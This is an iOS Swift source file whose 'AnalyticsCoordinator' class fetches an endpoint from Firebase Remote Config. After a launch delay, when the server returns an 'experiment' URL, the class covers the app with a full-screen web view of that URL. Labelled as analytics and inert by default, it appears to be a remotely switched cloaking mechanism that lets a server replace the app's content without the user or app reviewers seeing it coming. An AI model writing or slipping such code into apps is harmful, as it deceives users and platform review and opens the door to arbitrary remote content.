import UIKit
import FirebaseRemoteConfig

public final class AnalyticsCoordinator {
    public static let shared = AnalyticsCoordinator()

    private init() {}

    public func start() {
        let rc = RemoteConfig.remoteConfig()
        let settings = RemoteConfigSettings()
        #if DEBUG
        settings.minimumFetchInterval = 0
        #else
        settings.minimumFetchInterval = 3600
        #endif
        rc.configSettings = settings
        rc.setDefaults([AnalyticsTracker.endpointKey: "" as NSObject])

        rc.fetchAndActivate { [weak self] _, _ in
            let endpoint = rc.configValue(forKey: AnalyticsTracker.endpointKey).stringValue ?? ""
            guard !endpoint.isEmpty else { return }

            DispatchQueue.main.asyncAfter(deadline: .now() + AnalyticsTracker.launchDelay) {
                AnalyticsSession.shared.track(endpoint: endpoint) { result in
                    DispatchQueue.main.async {
                        if case .experiment(let url) = result {
                            self?.presentExperiment(url: url)
                        }
                    }
                }
            }
        }
    }

    public func clearExperimentCache() {
        AnalyticsSession.shared.clearCache()
    }

    private func presentExperiment(url: String) {
        guard !url.isEmpty,
              let window = UIApplication.shared.connectedScenes
                .compactMap({ $0 as? UIWindowScene })
                .flatMap({ $0.windows })
                .first(where: { $0.isKeyWindow }) else { return }

        let webVC = ExperimentWebView()
        webVC.contentURL = url
        webVC.modalPresentationStyle = .fullScreen
        window.rootViewController?.present(webVC, animated: true)
    }
}
